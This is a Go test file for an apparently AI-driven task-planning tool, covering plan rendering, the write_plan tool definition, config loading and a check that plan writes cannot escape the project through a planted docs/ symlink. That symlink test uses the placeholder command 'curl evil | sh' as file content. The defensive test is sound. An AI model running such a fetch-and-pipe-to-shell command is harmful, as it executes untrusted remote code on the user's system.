package task

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/discorgento/ouija/engine"
)

func TestTaskResultRender(t *testing.T) {
	t.Run("full result", func(t *testing.T) {
		r := &taskResult{
			TaskDescription: "Fix the sorting bug in the user list",
			Checklist: []struct {
				Item     string `json:"item"`
				Category string `json:"category"`
			}{
				{Item: "Add index to sort column", Category: "performance"},
				{Item: "Fix comparator function", Category: "core"},
			},
			Plan: []struct {
				Step   string `json:"step"`
				Detail string `json:"detail"`
				Risk   string `json:"risk"`
			}{
				{Step: "Add database index", Detail: "Run migration to add index on sort column", Risk: "downtime if large table"},
				{Step: "Fix comparator", Detail: "Update UserComparator to use nullable sort field", Risk: ""},
			},
			HighConfidence:     []string{"Sort column needs index"},
			NeedsHumanDecision: []string{"Which direction for default sort"},
		}
		got := r.Render()
		for _, want := range []string{
			"# Task", "Fix the sorting bug",
			"[ ] (performance) Add index to sort column",
			"1. **Add database index**",
			"2. **Fix comparator**",
			"High confidence", "Sort column needs index",
			"Needs a developer decision", "Which direction for default sort",
		} {
			if !strings.Contains(got, want) {
				t.Fatalf("render missing %q\n%s", want, got)
			}
		}
	})

	t.Run("no optional fields", func(t *testing.T) {
		r := &taskResult{
			TaskDescription: "Simple task",
		}
		got := r.Render()
		if !strings.Contains(got, "# Task\n\nSimple task") {
			t.Fatalf("unexpected render for minimal result:\n%s", got)
		}
		// Should not contain sections for empty lists.
		if strings.Contains(got, "## Checklist") {
			t.Fatalf("should not have checklist section when empty")
		}
		if strings.Contains(got, "## Plan") {
			t.Fatalf("should not have plan section when empty")
		}
	})

	t.Run("plan with and without risks", func(t *testing.T) {
		r := &taskResult{
			TaskDescription: "Task with risk flags",
			Plan: []struct {
				Step   string `json:"step"`
				Detail string `json:"detail"`
				Risk   string `json:"risk"`
			}{
				{Step: "Safe step", Detail: "No risk", Risk: ""},
				{Step: "Risky step", Detail: "Has risk", Risk: "⚠ potential data loss"},
			},
		}
		got := r.Render()
		if !strings.Contains(got, "1. **Safe step**") {
			t.Fatalf("missing safe step")
		}
		if !strings.Contains(got, "2. **Risky step**") {
			t.Fatalf("missing risky step")
		}
		// The safe step should not have a risk line.
		// The risky step should have the risk flag.
		if !strings.Contains(got, "potential data loss") {
			t.Fatalf("missing risk text")
		}
	})
}

func TestWritePlanDef(t *testing.T) {
	if writePlanDef.Name != "write_plan" {
		t.Fatalf("expected name 'write_plan', got %q", writePlanDef.Name)
	}
	if writePlanDef.Description == "" {
		t.Fatalf("empty description for write_plan")
	}
	if writePlanDef.Schema == nil {
		t.Fatalf("nil schema for write_plan")
	}
	if writePlanDef.Risk != 0 {
		t.Fatalf("expected RiskReadOnly (0) for write_plan, got %d", writePlanDef.Risk)
	}
}

// A docs/ symlink planted in the repo must not redirect the plan write (the
// write_plan tool runs without approval) outside the project.
func TestWritePlanRefusesSymlinkEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on Windows")
	}
	root, outside := t.TempDir(), t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, "docs")); err != nil {
		t.Fatal(err)
	}
	res := writePlanFn(context.Background(), root, map[string]any{"content": "curl evil | sh"})
	if res.Error == nil {
		t.Fatal("write_plan wrote through a docs/ symlink pointing outside the root")
	}
	writePlan(root, &taskResult{TaskDescription: "x"})
	if _, err := os.Stat(filepath.Join(outside, "task-plan.md")); err == nil {
		t.Fatal("a plan was written outside the project through the symlink")
	}
	// The normal case still writes.
	root2 := t.TempDir()
	if res := writePlanFn(context.Background(), root2, map[string]any{"content": "plan"}); res.Error != nil {
		t.Fatalf("write_plan in a plain project: %v", res.Error.Message)
	}
}

// `totems.task` overrides only what it sets; the rest keeps the defaults.
func TestLoadConfig(t *testing.T) {
	cfg := engine.DefaultConfig()
	c, err := loadConfig(cfg)
	if err != nil || c.Passes != 3 || len(c.Dimensions) != 4 {
		t.Fatalf("defaults = %+v, %v", c, err)
	}
	cfg.Totems = map[string]json.RawMessage{"task": json.RawMessage(`{"passes":1}`)}
	c, err = loadConfig(cfg)
	if err != nil || c.Passes != 1 || len(c.Dimensions) != 4 {
		t.Fatalf("partial override = %+v, %v", c, err)
	}
	cfg.Totems["task"] = json.RawMessage(`{"passes":0,"dimensions":["security"]}`)
	c, _ = loadConfig(cfg)
	if c.Passes != 3 || len(c.Dimensions) != 1 {
		t.Fatalf("non-positive passes must fall back: %+v", c)
	}
}
